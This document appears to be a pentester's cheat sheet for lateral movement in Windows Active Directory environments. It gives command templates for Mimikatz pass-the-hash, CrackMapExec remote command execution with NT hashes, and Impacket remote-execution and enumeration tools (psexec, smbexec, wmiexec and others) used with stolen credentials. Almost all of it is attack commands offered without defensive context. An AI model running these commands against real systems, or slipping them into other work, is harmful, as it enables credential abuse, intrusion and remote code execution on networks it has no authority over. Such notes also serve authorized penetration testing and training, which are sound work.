### Mimikatz
```
token::revert
```
```
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NT_HASH> /run:"COMMAND>"
```
### Crackmapexec
```
crackmapexec <PROTOCOL> <HOST> -d <DOMAIN> -u <USER> -H <NT_HASH> -x <COMMAND>
#Can use --local-auth instead of -d
#-t <THREADS>
#--verbose
```
### Impacket
- If you have a kerberos ticket, you can omit -hashes and use -k -no-pass instead
```
impacket-smbclient <DOMAIN>\<USER>:<PASSWORD>@<HOST>
```
```
impacket-smbexec <DOMAIN>\<USER>:<PASSWORD>@<HOST>
```
```
impacket-psexec <DOMAIN>\<USER>:<PASSWORD>@<HOST>
```
```
impacket-atexec <DOMAIN>\<USER>:<PASSWORD>@<HOST>
```
```
impacket-wmiexec <DOMAIN>\<USER>:<PASSWORD>@<HOST>
```
```
impacket-dcomexec <DOMAIN>\<USER>:<PASSWORD>@<HOST>
```
```
impacket-mssqlclient <DOMAIN>\<USER>:<PASSWORD>@<HOST>
```
- Other Impacket scripts
```
impacket-GetADUsers
impacket-getArch
impacket-lookupsid
impacket-machine_role
impacket-netview
impacket-rdp_check
impacket-mqtt_check
impacket-mimikatz
impacket-reg
impacket-services
impacket-rpcdump
impacket-samrdump
impacket-addcomputer
```